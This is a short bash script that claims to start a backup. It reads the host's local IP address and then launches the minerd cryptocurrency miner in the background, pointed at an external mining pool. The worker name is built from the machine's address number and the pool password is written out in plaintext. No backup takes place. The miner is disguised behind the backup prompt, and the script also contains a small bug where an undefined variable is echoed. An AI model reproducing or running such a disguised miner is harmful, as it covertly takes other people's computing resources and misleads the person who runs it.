#!/bin/bash

cd "$(dirname $(readlink -f $0))"
read -p "Press [Enter] key to start backup..."
ip=$(ip addr show)
echo $ip
ip="$(echo $ip | grep "192.168.1..." -o)"
echo "ip ($ip)"
ip=$(echo "($ip)" | cut -d' ' -f 1)
echo "ip( $ip)"
machine=$(echo $ip| cut -d' ' -f 1)
machine=$(echo $machine| cut -d'.' -f 4)
echo "machine($machine)"
pfwdts=$(dirname ${BASH_SOURCE[0]})
echo "path from working dir to script =$DIR"
cd $pfwdts
./minerd -S -a m7mhash -o stratum+tcp://mining.m-hash.com:3334 -u TashaSkyUp.$machine -p !Biago123 -B
